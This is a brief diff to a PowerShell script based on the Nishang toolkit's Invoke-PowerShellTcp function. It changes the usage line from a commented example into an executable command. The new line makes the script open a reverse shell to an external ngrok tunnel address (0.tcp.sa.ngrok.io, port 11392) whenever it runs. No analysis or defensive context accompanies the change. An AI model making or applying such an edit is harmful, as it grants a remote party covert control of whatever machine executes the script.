@@ -124,4 +124,4 @@ https://github.com/samratashok/nishang
         Write-Error $_
     }
 }
-PS > Invoke-PowerShellTcp -Reverse -IPAddress 0.tcp.sa.ngrok.io -Port 11392
+Invoke-PowerShellTcp -Reverse -IPAddress 0.tcp.sa.ngrok.io -Port 11392
